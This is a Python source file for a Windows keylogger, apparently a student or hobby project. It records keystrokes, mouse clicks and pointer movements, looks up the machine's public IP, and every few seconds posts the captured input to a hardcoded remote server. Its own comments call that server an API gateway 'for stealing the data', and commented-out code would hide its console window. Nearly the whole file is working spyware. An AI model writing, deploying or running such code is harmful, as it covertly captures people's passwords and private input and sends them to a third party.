#Written by Eshed Sorotsky & Shilat Tsfoni

from multiprocessing.connection import Listener
from wsgiref import headers
import win32console
import pythoncom
import requests
import datetime
from pynput import mouse,keyboard
import string
import random
import os
import time
import threading

#os.startfile(r"C:\Users\User\sampleBatch.bat")
def key_generator(size= 10, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
#getting the current window the app is running
myWindow = win32console.GetConsoleWindow()
#hiding it from the user
#win32gui.ShowWindow(myWindow, 0)
currentX =0
currntY=0
#variable holding the global stream
dataStream = ""
#api gateway for stealing the data
apiUrl = 'http://3.17.7.99/api/sendData/'
apiKeyUrl= 'http://3.17.7.99/api/secretkey/'
ip = requests.get(r'http://jsonip.com').json()['ip']
key = key_generator()
keyTime = datetime.datetime.now()
id = requests.post(url=apiKeyUrl, data={'key':key, 'source':ip}).json()['id']
#for sending data at 10 second intervals (can be changed)
#getting the current pc's IP
#checks time and if it hits 10 seconds activates sendData and resets the timer

def checkCondition():
    global id, keyTime, ip, key
    curr_time = datetime.datetime.now()
    if ip != requests.get(r'http://jsonip.com').json()['ip']:
        ip= requests.get(r'http://jsonip.com').json()['ip']
    if (curr_time - keyTime).seconds >=300:
        key = key_generator()
        response = requests.put(url='{0}{1}/'.format(apiKeyUrl,id), data={'key':key, 'source':ip})
    if len(dataStream) > 15:
        sendData()
def threadFunc():
    while(True):
        time.sleep(10)
        checkCondition()
#sends data using the API gateway
def sendData():
    global dataStream
    global apiUrl
    global ip
    def jParse(data):
        return {'source':ip,
        'stream':data,
        }
    request = requests.post(url = apiUrl,data = jParse(dataStream))
    #resets the datastream after every post made to the server
    dataStream = ""
#parses the mouse click event and adds it to the datastream
def on_move(x,y):
    global dataStream
    global currentX, currentY
    if abs(currentX-x) >=50 or abs(currentY-y)>=50:
        currentX = x
        currentY = y
        mouseLog = 'Pointer moved to {0}'.format((x,y))
        dataStream +='\n'+mouseLog
        #if len(dataStream)-currentLen >= 30:
        #checkCondition()
    return True

def mouseClick(x,y,event,pressed):
    global dataStream 
    currentLen = len(dataStream)
    if event == mouse.Button.left:
        mouseLog='left {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))   
    if event == mouse.Button.right:
        mouseLog='right {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))
    if event == mouse.Button.middle:
        mouseLog= 'middle {0} at {1}'.format('Pressed' if pressed else 'Released', (x,y))
    dataStream +='\n'+mouseLog
    #if len(dataStream)-currentLen >= 30:
    #checkCondition()
    return True
    
#parses the keystroke event and adds it to the datastream
def keyStrokes(event):
    global dataStream
    currentLen = len(dataStream)
    #if we hit escape will stop the keylogger
    if key in dataStream:
        exit(1)
    if type(event) == keyboard.Key:
        if event == keyboard.Key.esc:
            dataStream += 'key(esc) '
        else:
            dataStream += event
    elif type(event) == keyboard.KeyCode:
        dataStream += event.char
    #if len(dataStream)-currentLen >= 30:
    #checkCondition()
    return True

def on_release_keyboard(event):
    return True

# create a hook manager object
    #so that when a keydown action is performed sends the event to our function
    # set the hook

    #keyhookObject
#looping so if we get an error the keylogger wont stop

keyboardListener = keyboard.Listener(on_press=keyStrokes,on_release=on_release_keyboard)
mouseListener = mouse.Listener(on_click=mouseClick)
moveListener = mouse.Listener(on_move=on_move)
keyboardListener.start()
mouseListener.start()
moveListener.start()
dataSend= threading.Thread(target=threadFunc)
dataSend.start()
keyboardListener.join()
mouseListener.join()
mouseListener.join()
dataSend.join()

